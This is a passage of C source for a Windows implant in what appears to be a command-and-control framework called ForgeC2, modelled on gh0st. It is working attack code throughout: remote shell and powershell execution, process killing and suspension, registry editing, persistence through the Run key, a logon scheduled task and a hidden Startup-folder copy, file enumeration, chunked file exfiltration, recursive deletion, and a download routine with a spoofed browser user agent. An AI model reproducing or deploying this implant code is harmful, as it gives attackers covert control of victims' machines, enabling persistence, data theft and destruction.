            id, type, esc, rid ? rid : "");
    }
    free(esc);
    return o;
}

static char *emit_error_result(unsigned long long id, const char *type,
                               const char *err, const char *rid) {
    char *esc = jescape(err ? err : "failed", strlen(err ? err : "failed"));
    char *o;
    size_t need;
    if (!esc) return NULL;
    need = strlen(esc) + strlen(type) + 128;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"error\":\"%s\",\"rid\":\"%s\"}",
            id, type, esc, rid ? rid : "");
    }
    free(esc);
    return o;
}

/* Shell with interpreter awareness: powershell shell runs via powershell.exe. */
static char *exec_shell_full(const char *cmd, const char *shell, DWORD *outlen) {
    char *full = NULL;
    char *out = NULL;
    if (shell && (strstr(shell, "powershell") || strstr(shell, "PowerShell"))) {
        size_t nl = strlen(cmd) + 64;
        full = (char *)malloc(nl);
        if (!full) return NULL;
        _snprintf(full, nl, "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd);
        out = exec_shell(full, outlen);
        free(full);
        return out;
    }
    return exec_shell(cmd ? cmd : "", outlen);
}

static char *do_ps(DWORD *outlen) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    char *buf;
    size_t cap = 65536, len = 0;
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    len = (size_t)_snprintf(buf, cap, "PID\tPPID\tTHREADS\tMEM_KB\tNAME\n");
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        if (outlen) *outlen = (DWORD)len;
        return buf;
    }
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            char line[640];
            char mems[32];
            int n;
            HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (hp) {
                PROCESS_MEMORY_COUNTERS pmc;
                memset(&pmc, 0, sizeof(pmc));
                pmc.cb = sizeof(pmc);
                if (GetProcessMemoryInfo(hp, &pmc, sizeof(pmc)))
                    _snprintf(mems, sizeof(mems), "%llu", pmc.WorkingSetSize / 1024);
                else
                    strcpy_s(mems, sizeof(mems), "-");
                CloseHandle(hp);
            } else {
                strcpy_s(mems, sizeof(mems), "-");
            }
            n = _snprintf(line, sizeof(line), "%lu\t%lu\t%ld\t%s\t%s\n",
                (unsigned long)pe.th32ProcessID,
                (unsigned long)pe.th32ParentProcessID, (long)pe.cntThreads,
                mems, pe.szExeFile);
            if (len + (size_t)n + 1 > cap) {
                if (cap >= OUT_CAP) break;
                cap *= 2;
                if (cap > OUT_CAP + 65536) cap = OUT_CAP + 65536;
                buf = (char *)realloc(buf, cap);
                if (!buf) { CloseHandle(snap); return NULL; }
            }
            memcpy(buf + len, line, (size_t)n);
            len += (size_t)n;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

/* ---------- system management (gh0st C_SYSTEM/C_SERVICE/C_REGEDIT parity) --- */

static DWORD find_pid_by_name(const char *name) {
    HANDLE snap;
    PROCESSENTRY32 pe;
    char with_exe[MAX_PATH];
    DWORD pid = 0;
    if (!name || !*name) return 0;
    _snprintf(with_exe, sizeof(with_exe), "%s.exe", name);
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0 || _stricmp(pe.szExeFile, with_exe) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static int resolve_pid(const char *target, DWORD *pid_out) {
    char *end = NULL;
    unsigned long v;
    if (!target || !*target || !pid_out) return -1;
    v = strtoul(target, &end, 10);
    if (end && *end == '\0' && v > 0 && v <= 0xFFFFFFFEu) {
        *pid_out = (DWORD)v;
        return 0;
    }
    *pid_out = find_pid_by_name(target);
    return *pid_out ? 0 : -1;
}

static char *do_killproc(const char *target, DWORD *outlen) {
    DWORD pid = 0;
    HANDLE h;
    char *out;
    if (resolve_pid(target, &pid) != 0) return NULL;
    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return NULL;
    if (!TerminateProcess(h, 1)) { CloseHandle(h); return NULL; }
    CloseHandle(h);
    out = (char *)malloc(64);
    if (!out) return NULL;
    _snprintf(out, 64, "killed pid %lu", (unsigned long)pid);
    if (outlen) *outlen = (DWORD)strlen(out);
    return out;
}

static char *do_suspend_resume(const char *target, int suspend, DWORD *outlen) {
    DWORD pid = 0;
    HANDLE snap;
    THREADENTRY32 te;
    int count = 0;
    char *out;
    if (resolve_pid(target, &pid) != 0) return NULL;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            HANDLE th;
            if (te.th32OwnerProcessID != pid) continue;
            th = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (!th) continue;
            if (suspend) { if (SuspendThread(th) != (DWORD)-1) count++; }
            else { if (ResumeThread(th) != (DWORD)-1) count++; }
            CloseHandle(th);
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    if (count == 0) return NULL;
    out = (char *)malloc(96);
    if (!out) return NULL;
    _snprintf(out, 96, "%s %d threads (pid=%lu)",
        suspend ? "suspended" : "resumed", count, (unsigned long)pid);
    if (outlen) *outlen = (DWORD)strlen(out);
    return out;
}

static char *do_services(DWORD *outlen) {
    char *out = exec_shell_full(
        "Get-Service | Select-Object -Property Name, DisplayName, Status, StartType | Sort-Object -Property Status, Name | Format-Table -AutoSize | Out-String",
        "powershell", outlen);
    if (out && *out) return out;
    if (out) free(out);
    return exec_shell_full("sc query state= all", NULL, outlen);
}

static HKEY reg_hive(const char *path, const char **sub_out) {
    if (!path || !sub_out) return NULL;
    if (_strnicmp(path, "HKLM\\", 5) == 0) { *sub_out = path + 5; return HKEY_LOCAL_MACHINE; }
    if (_strnicmp(path, "HKCU\\", 5) == 0) { *sub_out = path + 5; return HKEY_CURRENT_USER; }
    if (_strnicmp(path, "HKCR\\", 5) == 0) { *sub_out = path + 5; return HKEY_CLASSES_ROOT; }
    if (_strnicmp(path, "HKU\\", 4) == 0) { *sub_out = path + 4; return HKEY_USERS; }
    if (_strnicmp(path, "HKCC\\", 5) == 0) { *sub_out = path + 5; return HKEY_CURRENT_CONFIG; }
    return NULL;
}

static char *do_reg_get(const char *key, DWORD *outlen) {
    char cmd[2048];
    char *out;
    if (!key || !*key) return NULL;
    _snprintf(cmd, sizeof(cmd), "reg query \"%s\" /s", key);
    out = exec_shell_full(cmd, NULL, outlen);
    if (!out) return NULL;
    if (_strnicmp(out, "ERROR", 5) == 0) { free(out); return NULL; }
    return out;
}

/* Mirror Go regSetWindows: Data is "TYPE|value", written to the key's
 * default value (/ve). Returns 0 ok, -1 failure, -2 bad format. */
static int do_reg_set_native(const char *path, const char *data) {
    HKEY hive;
    const char *sub = NULL;
    const char *sep;
    char typebuf[32];
    const char *val;
    DWORD type = REG_SZ;
    HKEY hk = NULL;
    LONG rc;
    if (!path || !*path || !data) return -2;
    hive = reg_hive(path, &sub);
    if (!hive || !sub || !*sub) return -2;
    sep = strchr(data, '|');
    if (!sep) return -2;
    if ((size_t)(sep - data) >= sizeof(typebuf)) return -2;
    memcpy(typebuf, data, (size_t)(sep - data));
    typebuf[sep - data] = '\0';
    val = sep + 1;
    if (_stricmp(typebuf, "REG_SZ") == 0) type = REG_SZ;
    else if (_stricmp(typebuf, "REG_EXPAND_SZ") == 0) type = REG_EXPAND_SZ;
    else if (_stricmp(typebuf, "REG_DWORD") == 0) type = REG_DWORD;
    else if (_stricmp(typebuf, "REG_QWORD") == 0) type = REG_QWORD;
    else if (_stricmp(typebuf, "REG_BINARY") == 0) type = REG_BINARY;
    else if (_stricmp(typebuf, "REG_MULTI_SZ") == 0) type = REG_MULTI_SZ;
    else return -2;
    rc = RegCreateKeyExA(hive, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (rc != ERROR_SUCCESS) return -1;
    if (type == REG_DWORD) {
        DWORD v = (DWORD)strtoul(val, NULL, 0);
        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)&v, sizeof(v));
    } else if (type == REG_QWORD) {
        unsigned long long v = _strtoui64(val, NULL, 0);
        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)&v, sizeof(v));
    } else if (type == REG_BINARY) {
        size_t n = strlen(val) / 2, i;
        BYTE *b = (BYTE *)malloc(n ? n : 1);
        if (!b) { RegCloseKey(hk); return -1; }
        for (i = 0; i < n; i++) {
            unsigned int byte = 0;
            sscanf_s(val + i * 2, "%2x", &byte);
            b[i] = (BYTE)byte;
        }
        rc = RegSetValueExA(hk, NULL, 0, type, b, (DWORD)n);
        cng_wipe(b, n);
        free(b);
    } else if (type == REG_MULTI_SZ) {
        size_t n = strlen(val) + 2;
        char *m = (char *)malloc(n);
        if (!m) { RegCloseKey(hk); return -1; }
        memcpy(m, val, strlen(val) + 1);
        m[strlen(val) + 1] = '\0';
        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)m, (DWORD)n);
        cng_wipe((BYTE *)m, (DWORD)n);
        free(m);
    } else {
        rc = RegSetValueExA(hk, NULL, 0, type, (const BYTE *)val, (DWORD)(strlen(val) + 1));
    }
    RegCloseKey(hk);
    return rc == ERROR_SUCCESS ? 0 : -1;
}

static int do_reg_delete_native(const char *key) {
    HKEY hive;
    const char *sub = NULL;
    LONG rc;
    if (!key || !*key) return -1;
    hive = reg_hive(key, &sub);
    if (!hive || !sub || !*sub) return -1;
    rc = RegDeleteTreeA(hive, sub);
    return rc == ERROR_SUCCESS ? 0 : -1;
}

/* C-implant persistence names mirror the Go default persistencePrefix. */
#define CPERSIST_RUN_VALUE "ForgeC2"
#define CPERSIST_TASK_NAME "ForgeC2Update"
#define CPERSIST_STARTUP_FILE "ForgeC2.exe"

static int self_exe_path(char *out, DWORD cap) {
    DWORD n;
    if (!out || cap == 0) return -1;
    n = GetModuleFileNameA(NULL, out, cap);
    return (n > 0 && n < cap) ? 0 : -1;
}

static void startup_file_path(char *out, DWORD cap) {
    char appdata[MAX_PATH] = {0};
    DWORD n = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    if (n == 0 || n >= sizeof(appdata)) {
        n = GetEnvironmentVariableA("LOCALAPPDATA", appdata, sizeof(appdata));
        if (n == 0 || n >= sizeof(appdata)) { out[0] = '\0'; return; }
    }
    _snprintf(out, cap, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s",
        appdata, CPERSIST_STARTUP_FILE);
}

/* Always returns malloc'd status text (Go applyPersistence parity); NULL only on OOM. */
static char *do_persist_add(const char *method, const char *args) {
    char binary[MAX_PATH] = {0};
    char msg[2048];
    if (!method || !*method) {
        _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method ? method : "");
        return _strdup(msg);
    }
    if (args && *args) {
        _snprintf(binary, sizeof(binary), "%s", args);
    } else if (self_exe_path(binary, sizeof(binary)) != 0) {
        _snprintf(msg, sizeof(msg), "%s: failed to resolve binary path", method);
        return _strdup(msg);
    }
    if (strcmp(method, "registry") == 0) {
        HKEY hk = NULL;
        LONG rc = RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
        if (rc == ERROR_SUCCESS)
            rc = RegSetValueExA(hk, CPERSIST_RUN_VALUE, 0, REG_SZ,
                (const BYTE *)binary, (DWORD)(strlen(binary) + 1));
        if (hk) RegCloseKey(hk);
        if (rc == ERROR_SUCCESS)
            _snprintf(msg, sizeof(msg), "registry: persistence added via HKCU Run key -> %s", binary);
        else
            _snprintf(msg, sizeof(msg), "registry: failed (%lu)", (unsigned long)rc);
        return _strdup(msg);
    }
    if (strcmp(method, "scheduled_task") == 0) {
        char cmd[2048];
        DWORD olen = 0;
        char *out;
        _snprintf(cmd, sizeof(cmd), "schtasks /create /tn %s /tr \"%s\" /sc onlogon /f",
            CPERSIST_TASK_NAME, binary);
        out = exec_shell_full(cmd, NULL, &olen);
        if (out && (strstr(out, "SUCCESS") || strstr(out, "success"))) {
            _snprintf(msg, sizeof(msg), "scheduled_task: created task '%s' -> %s", CPERSIST_TASK_NAME, binary);
        } else {
            _snprintf(msg, sizeof(msg), "scheduled_task: failed%s%s",
                out && *out ? ": " : "", out && *out ? out : "");
        }
        if (out) free(out);
        return _strdup(msg);
    }
    if (strcmp(method, "startup_folder") == 0) {
        char dst[MAX_PATH] = {0};
        startup_file_path(dst, sizeof(dst));
        if (!dst[0]) {
            _snprintf(msg, sizeof(msg), "startup_folder: failed to resolve startup dir");
            return _strdup(msg);
        }
        if (CopyFileA(binary, dst, FALSE)) {
            SetFileAttributesA(dst, FILE_ATTRIBUTE_HIDDEN);
            _snprintf(msg, sizeof(msg), "startup_folder: copied to %s", dst);
        } else {
            _snprintf(msg, sizeof(msg), "startup_folder: copy failed (%lu)", (unsigned long)GetLastError());
        }
        return _strdup(msg);
    }
    _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method);
    return _strdup(msg);
}

static char *do_persist_list(void) {
    char *buf = (char *)malloc(8192);
    size_t len = 0;
    HKEY hk = NULL;
    char dst[MAX_PATH] = {0};
    DWORD olen = 0;
    char *out;
    if (!buf) return NULL;
    buf[0] = '\0';
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
        DWORD n = 0;
        LONG rc = RegQueryValueExA(hk, CPERSIST_RUN_VALUE, NULL, NULL, NULL, &n);
        RegCloseKey(hk);
        len += (size_t)_snprintf(buf + len, 8192 - len, "%s Registry Run key (%s): %s\n",
            rc == ERROR_SUCCESS ? "[+]" : "[-]", CPERSIST_RUN_VALUE,
            rc == ERROR_SUCCESS ? "found" : "not found");
    } else {
        len += (size_t)_snprintf(buf + len, 8192 - len, "[-] Registry Run key (%s): not found\n",
            CPERSIST_RUN_VALUE);
    }
    out = exec_shell_full("schtasks /query /tn " CPERSIST_TASK_NAME " /fo LIST", NULL, &olen);
    len += (size_t)_snprintf(buf + len, 8192 - len, "%s Scheduled task (%s): %s\n",
        (out && !strstr(out, "ERROR")) ? "[+]" : "[-]", CPERSIST_TASK_NAME,
        (out && !strstr(out, "ERROR")) ? "found" : "not found");
    if (out) free(out);
    startup_file_path(dst, sizeof(dst));
    len += (size_t)_snprintf(buf + len, 8192 - len, "%s Startup folder: %s %s\n",
        (dst[0] && GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) ? "[+]" : "[-]",
        CPERSIST_STARTUP_FILE,
        (dst[0] && GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) ? "present" : "not found");
    (void)len;
    return buf;
}

static char *do_persist_remove(const char *method) {
    char msg[1024];
    if (!method || !*method) {
        _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method ? method : "");
        return _strdup(msg);
    }
    if (strcmp(method, "registry") == 0) {
        HKEY hk = NULL;
        LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hk);
        if (rc == ERROR_SUCCESS) {
            rc = RegDeleteValueA(hk, CPERSIST_RUN_VALUE);
            RegCloseKey(hk);
        }
        _snprintf(msg, sizeof(msg), rc == ERROR_SUCCESS ?
            "registry: removed Run key" : "registry remove: failed (no Run key entry found)");
        return _strdup(msg);
    }
    if (strcmp(method, "scheduled_task") == 0) {
        DWORD olen = 0;
        char cmd[256];
        char *out;
        _snprintf(cmd, sizeof(cmd), "schtasks /delete /tn %s /f", CPERSIST_TASK_NAME);
        out = exec_shell_full(cmd, NULL, &olen);
        _snprintf(msg, sizeof(msg), (out && (strstr(out, "SUCCESS") || strstr(out, "success"))) ?
            "scheduled_task: removed task" : "scheduled_task remove: failed (no task found)");
        if (out) free(out);
        return _strdup(msg);
    }
    if (strcmp(method, "startup_folder") == 0) {
        char dst[MAX_PATH] = {0};
        startup_file_path(dst, sizeof(dst));
        if (dst[0] && DeleteFileA(dst)) {
            _snprintf(msg, sizeof(msg), "startup_folder: removed startup file");
        } else {
            _snprintf(msg, sizeof(msg), "startup_folder remove: failed (no startup file found)");
        }
        return _strdup(msg);
    }
    _snprintf(msg, sizeof(msg), "unknown persistence method: %s", method);
    return _strdup(msg);
}

static const char *stristr_c(const char *hay, const char *needle) {
    size_t nl;
    if (!hay || !needle || !*needle) return NULL;
    nl = strlen(needle);
    for (; *hay; hay++) {
        if (_strnicmp(hay, needle, nl) == 0) return hay;
    }
    return NULL;
}

typedef struct {
    char *buf;
    size_t len;
    size_t cap;
    int count;
} wincollect_t;

static BOOL CALLBACK win_enum_cb(HWND hwnd, LPARAM lp) {
    wincollect_t *wc = (wincollect_t *)lp;
    WCHAR wtitle[512];
    char title[1024];
    DWORD pid = 0;
    int n, m;
    char line[1408];
    if (!IsWindowVisible(hwnd)) return TRUE;
    if (GetWindowTextLengthW(hwnd) == 0) return TRUE;
    memset(wtitle, 0, sizeof(wtitle));
    GetWindowTextW(hwnd, wtitle, (int)(sizeof(wtitle) / sizeof(wtitle[0])));
    m = WideCharToMultiByte(CP_UTF8, 0, wtitle, -1, title, (int)sizeof(title) - 1, NULL, NULL);
    if (m <= 0) return TRUE;
    title[sizeof(title) - 1] = '\0';
    GetWindowThreadProcessId(hwnd, &pid);
    n = _snprintf(line, sizeof(line), "%llu\t%lu\t%s\n",
        (unsigned long long)(uintptr_t)hwnd, (unsigned long)pid, title);
    if (wc->len + (size_t)n + 1 > wc->cap) {
        size_t ncap = wc->cap * 2;
        char *nb;
        if (ncap > OUT_CAP) return FALSE;
        nb = (char *)realloc(wc->buf, ncap);
        if (!nb) return FALSE;
        wc->buf = nb;
        wc->cap = ncap;
    }
    memcpy(wc->buf + wc->len, line, (size_t)n);
    wc->len += (size_t)n;
    wc->count++;
    if (wc->count >= 500) return FALSE;
    return TRUE;
}

static char *do_window_list(DWORD *outlen) {
    wincollect_t wc;
    const char *hdr = "HWND\tPID\tTITLE\n";
    char foot[64];
    wc.cap = 65536;
    wc.len = 0;
    wc.count = 0;
    wc.buf = (char *)malloc(wc.cap);
    if (!wc.buf) return NULL;
    memcpy(wc.buf, hdr, strlen(hdr));
    wc.len = strlen(hdr);
    EnumWindows(win_enum_cb, (LPARAM)&wc);
    _snprintf(foot, sizeof(foot), "# windows=%d\n", wc.count);
    if (wc.len + strlen(foot) + 1 <= wc.cap) {
        memcpy(wc.buf + wc.len, foot, strlen(foot));
        wc.len += strlen(foot);
    }
    wc.buf[wc.len] = '\0';
    if (outlen) *outlen = (DWORD)wc.len;
    return wc.buf;
}

static char *do_window_close(const char *target, DWORD *outlen) {
    char *end = NULL;
    unsigned long long v;
    char msg[1024];
    HWND hwnd = NULL;
    char tbuf[512];
    if (!target || !*target) return NULL;
    v = _strtoui64(target, &end, 10);
    if (end && *end == '\0' && v != 0) {
        hwnd = (HWND)(uintptr_t)v;
        if (!IsWindow(hwnd)) return NULL;
    } else {
        wincollect_t wc;
        _snprintf(tbuf, sizeof(tbuf), "%s", target);
        wc.cap = 65536;
        wc.len = 0;
        wc.count = 0;
        wc.buf = (char *)malloc(wc.cap);
        if (!wc.buf) return NULL;
        wc.buf[0] = '\0';
        EnumWindows(win_enum_cb, (LPARAM)&wc);
        /* Re-scan collected lines for the first title match. */
        {
            char *line = wc.buf;
            char *hit = NULL;
            while (line && *line) {
                char *nl = strchr(line, '\n');
                if (nl) *nl = '\0';
                if (strstr(line, "HWND") != line) {
                    char *tab1 = strchr(line, '\t');
                    char *tab2 = tab1 ? strchr(tab1 + 1, '\t') : NULL;
                    if (tab2 && stristr_c(tab2 + 1, tbuf)) { hit = line; break; }
                }
                line = nl ? nl + 1 : NULL;
            }
            if (hit) {
                hwnd = (HWND)(uintptr_t)_strtoui64(hit, NULL, 10);
            }
        }
        free(wc.buf);
        if (!hwnd || !IsWindow(hwnd)) return NULL;
    }
    if (!PostMessageW(hwnd, WM_CLOSE, 0, 0)) return NULL;
    _snprintf(msg, sizeof(msg), "window_close: WM_CLOSE posted to HWND %llu",
        (unsigned long long)(uintptr_t)hwnd);
    {
        char *out = _strdup(msg);
        if (outlen && out) *outlen = (DWORD)strlen(out);
        return out;
    }
}

static char *do_ls(const char *path, DWORD *outlen) {
    char pat[MAX_PATH * 2];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char *buf;
    size_t cap = 32768, len = 0;
    const char *dir = (path && path[0]) ? path : "C:\\";
    buf = (char *)malloc(cap);
    if (!buf) return NULL;
    len = (size_t)_snprintf(buf, cap, "Type\tName\tSize\n");
    _snprintf(pat, sizeof(pat), "%s%s*", dir,
        (dir[strlen(dir)-1] == '\\' || dir[strlen(dir)-1] == '/') ? "" : "\\");
    h = FindFirstFileA(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        size_t m = strlen(dir) + 32;
        if (len + m + 1 > cap) { cap = len + m + 1; buf = (char *)realloc(buf, cap); }
        if (buf) len += (size_t)_snprintf(buf + len, cap - len, "ERROR: cannot list %s (%lu)\n", dir, GetLastError());
        if (outlen) *outlen = (DWORD)len;
        return buf;
    }
    do {
        char line[1024];
        int n;
        unsigned long long sz = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        const char *typ = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
        n = _snprintf(line, sizeof(line), "%s\t%s\t%llu\n", typ, fd.cFileName, sz);
        if (len + (size_t)n + 1 > cap) {
            if (cap >= OUT_CAP) break;
            cap *= 2;
            buf = (char *)realloc(buf, cap);
            if (!buf) { FindClose(h); return NULL; }
        }
        memcpy(buf + len, line, (size_t)n);
        len += (size_t)n;
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    buf[len] = '\0';
    if (outlen) *outlen = (DWORD)len;
    return buf;
}

static BYTE *do_read_file(const char *path, DWORD *outlen) {
    HANDLE h;
    DWORD sz, rd = 0;
    BYTE *buf;
    if (!path || !path[0]) return NULL;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    sz = GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz > OUT_CAP) sz = OUT_CAP;
    buf = (BYTE *)malloc(sz + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    *outlen = rd;
    return buf;
}

/* Offset-based chunk read (mirrors Go downloadFileChunk): default 1MB,
 * capped at 4MB. *roff echoes the effective offset. */
static BYTE *do_read_chunk(const char *path, long long offset, long long size,
                           DWORD *outlen, long long *roff) {
    HANDLE h;
    DWORD want, rd = 0;
    BYTE *buf;
    LARGE_INTEGER li;
    if (!path || !path[0]) return NULL;
    if (offset < 0) offset = 0;
    if (size <= 0) size = 1024 * 1024;
    if (size > 4 * 1024 * 1024) size = 4 * 1024 * 1024;
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    if (offset > 0) {
        li.QuadPart = offset;
        if (!SetFilePointerEx(h, li, NULL, FILE_BEGIN)) {
            CloseHandle(h); return NULL;
        }
    }
    want = (DWORD)size;
    buf = (BYTE *)malloc(want + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    ReadFile(h, buf, want, &rd, NULL);
    CloseHandle(h);
    *outlen = rd;
    if (roff) *roff = offset;
    return buf;
}

/* mkdir -p (mirrors Go os.MkdirAll): create each component, ignore already-exists. */
static int do_mkdir_all(const char *path) {
    char buf[MAX_PATH * 2];
    size_t i, n;
    DWORD attr;
    if (!path || !path[0]) return -1;
    if (strlen(path) >= sizeof(buf) - 2) return -1;
    strcpy_s(buf, sizeof(buf), path);
    n = strlen(buf);
    /* strip trailing slashes (but keep drive root like C:\) */
    while (n > 1 && (buf[n-1] == '\\' || buf[n-1] == '/')) buf[--n] = '\0';
    for (i = 1; buf[i]; i++) {
        if (buf[i] == '\\' || buf[i] == '/') {
            char save = buf[i];
            buf[i] = '\0';
            /* skip drive-letter prefix like "C:" */
            if (!(i == 2 && buf[1] == ':')) {
                if (!CreateDirectoryA(buf, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
                    attr = GetFileAttributesA(buf);
                    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) { buf[i] = save; return -1; }
                }
            }
            buf[i] = save;
        }
    }
    if (!CreateDirectoryA(buf, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        attr = GetFileAttributesA(buf);
        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) return -1;
    }
    return 0;
}

/* Recursive delete (mirrors Go os.RemoveAll): files via DeleteFileA, dirs walked. */
static int do_delete_recursive(const char *path) {
    DWORD attr;
    char pat[MAX_PATH * 2];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    if (!path || !path[0]) return -1;
    attr = GetFileAttributesA(path);
    if (attr == INVALID_FILE_ATTRIBUTES) return -1;
    if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileA(path) ? 0 : -1;
    }
    _snprintf(pat, sizeof(pat), "%s%s*", path,
        (path[strlen(path)-1] == '\\' || path[strlen(path)-1] == '/') ? "" : "\\");
    h = FindFirstFileA(pat, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            char child[MAX_PATH * 2];
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
            _snprintf(child, sizeof(child), "%s%s%s", path,
                (path[strlen(path)-1] == '\\' || path[strlen(path)-1] == '/') ? "" : "\\", fd.cFileName);
            do_delete_recursive(child);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
    return RemoveDirectoryA(path) ? 0 : -1;
}

static const char *base_name(const char *p) {
    const char *b1 = strrchr(p, '\\');
    const char *b2 = strrchr(p, '/');
    const char *b = b1 > b2 ? b1 : b2;
    return b ? b + 1 : p;
}

/* File result with transfer fields (filename/path/offset/size/mac). */
static char *emit_file_result(unsigned long long id, const char *type,
                              const char *b64out, const char *rid,
                              const char *filename, const char *path,
                              long long offset, long long size,
                              const char *machex) {
    char *fesc = jescape(filename ? filename : "", strlen(filename ? filename : ""));
    char *pesc = jescape(path ? path : "", strlen(path ? path : ""));
    char *o;
    size_t need;
    if (!fesc || !pesc) { free(fesc); free(pesc); return NULL; }
    need = strlen(b64out) + strlen(type) + strlen(fesc) + strlen(pesc) + 256;
    o = (char *)malloc(need);
    if (o) {
        _snprintf(o, need,
            "{\"task_id\":%llu,\"type\":\"%s\",\"output\":\"%s\","
            "\"encoding\":\"base64\",\"rid\":\"%s\",\"filename\":\"%s\","
            "\"path\":\"%s\",\"offset\":%lld,\"size\":%lld,\"mac\":\"%s\"}",
            id, type, b64out, rid ? rid : "", fesc, pesc,
            offset, size, machex ? machex : "");
    }
    free(fesc);
    free(pesc);
    return o;
}

/* Minimal HTTPS-capable file download over WinHTTP (C2-independent).
 * Cap 64MB. Returns 0 ok, -1 on failure with err filled. */
static int download_url_to_file(const char *url, const char *dest,
                                char *err, size_t errcap) {
    wchar_t wurl[4096];
    wchar_t whost[256], wpath[2048];
    URL_COMPONENTS uc;
    HINTERNET hs = NULL, hc = NULL, hr = NULL;
    HANDLE hf = INVALID_HANDLE_VALUE;
    DWORD total = 0;
    const DWORD CAP = 64 * 1024 * 1024;
    int rc = -1;
    if (!url || !url[0] || !dest || !dest[0]) {
        if (err) strcpy_s(err, errcap, "url and destination required");
        return -1;
    }
    if (!path_is_safe(dest)) {
        if (err) strcpy_s(err, errcap, "path traversal rejected");
        return -1;
    }
    if (MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 4096) <= 0) {
        if (err) strcpy_s(err, errcap, "bad url");
        return -1;
    }
    memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = whost; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = wpath; uc.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        if (err) strcpy_s(err, errcap, "bad url");
        return -1;
    }
    if (uc.nScheme != INTERNET_SCHEME_HTTP && uc.nScheme != INTERNET_SCHEME_HTTPS) {
        if (err) strcpy_s(err, errcap, "only http(s) supported");
        return -1;
    }
    hs = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hs) goto done;
    hc = WinHttpConnect(hs, whost, uc.nPort, 0);
    if (!hc) goto done;
    hr = WinHttpOpenRequest(hc, L"GET", wpath, NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
